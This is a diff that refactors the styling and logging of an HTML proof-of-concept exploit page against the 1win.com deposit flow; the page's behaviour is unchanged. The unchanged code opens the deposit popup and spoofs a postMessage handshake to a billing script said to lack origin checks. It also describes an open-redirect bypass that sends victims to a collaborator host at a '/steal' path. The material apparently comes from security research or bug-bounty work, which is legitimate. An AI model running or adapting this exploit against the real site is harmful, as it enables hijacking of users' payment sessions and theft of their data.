@@ -43,17 +43,15 @@
 <head>
   <meta charset="utf-8">
   <title>PoC 3 - L0() Open Redirect Bypass</title>
+  <link rel="stylesheet" href="shared/theme.css">
   <style>
-    body { font-family: monospace; background: #1a0a0a; color: #faa; padding: 20px; }
+    body { background: #1a0a0a; color: #faa; }
     h2 { color: #f70; }
-    code { background: #2a0000; padding: 2px 6px; border-radius: 3px; color: #ff9; }
+    code { background: #2a0000; color: #ff9; }
     .box { background: #000; border: 1px solid #f44; padding: 12px; margin: 10px 0; }
-    #log { height: 300px; overflow-y: auto; }
-    .hit { color: #f00; font-weight: bold; }
-    .evt { color: #fa7; }
-    .warn { color: #ff0; }
-    button { background: #2a0000; color: #faa; border: 1px solid #f44; padding: 8px 16px; cursor: pointer; margin: 4px; }
-    input { background: #1a0000; color: #faa; border: 1px solid #f44; padding: 6px; width: 400px; }
+    #log { height: 300px; }
+    button { background: #2a0000; color: #faa; border: 1px solid #f44; }
+    input { background: #1a0000; color: #faa; border: 1px solid #f44; width: 400px; }
   </style>
 </head>
 <body>
@@ -74,7 +72,7 @@
 
   <button onclick="testBypass()">Test L0 Bypass Logic</button>
   <button onclick="openDepositAndInject()">Open 1win Deposit + Inject (Path A)</button>
-  <button onclick="clearLog()">Clear</button>
+  <button onclick="logger.clear()">Clear</button>
 
   <div class="box" id="log"></div>
 
@@ -87,19 +85,18 @@
     <b>Result:</b> After victim initiates deposit → paywidget fires Hu() → parent KC() → window.location.href = "//YOUR-COLLABORATOR.NET/steal?"
   </div>
 
+<script src="shared/logger.js"></script>
 <script>
 const TARGET = 'https://1win.com';
 const WIDGET_READY = '__WIDGET_REDIRECT_FORM_READY__';
 let targetWindow = null;
 
-function log(msg, cls = '') {
-  const d = document.getElementById('log');
-  const ts = new Date().toISOString().slice(11, 23);
-  d.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
-  d.scrollTop = d.scrollHeight;
-}
+var logger = PocLogger.create({
+    timestampFormat: 'iso-ms',
+    useTextContent: false
+});
+function log(msg, cls) { logger.log(msg, cls); }
 
-// Verify the bypass logic locally (simulates L0() check)
 function testBypass() {
   const url = document.getElementById('redirectTarget').value;
   const base = 'https://1win.com';
@@ -117,8 +114,6 @@ function testBypass() {
   }
 }
 
-// Path A: Open 1win deposit, spoof WIDGET_READY on parent billing.js
-// billing.js Xi() has no origin check — it will advance state and open paywidget
 window.addEventListener('message', function(e) {
   log(`MSG from ${e.origin}: ${JSON.stringify(e.data).slice(0,150)}`, 'evt');
 });
@@ -142,15 +137,10 @@ function openDepositAndInject() {
 
   setTimeout(() => {
     log(`Sending "${WIDGET_READY}" to 1win deposit popup (Xi() has no origin check)...`, 'warn');
-    // billing.js Xi() listens with no origin check — this spoofs the handshake
     targetWindow.postMessage(WIDGET_READY, '*');
     log('Sent. Billing.js Xi() should resolve and advance payment state machine.', 'evt');
     log('Monitor the popup — paywidget may now open with attacker-influenced state.', 'evt');
   }, 4000);
-}
-
-function clearLog() {
-  document.getElementById('log').innerHTML = '';
 }
 </script>
 </body>
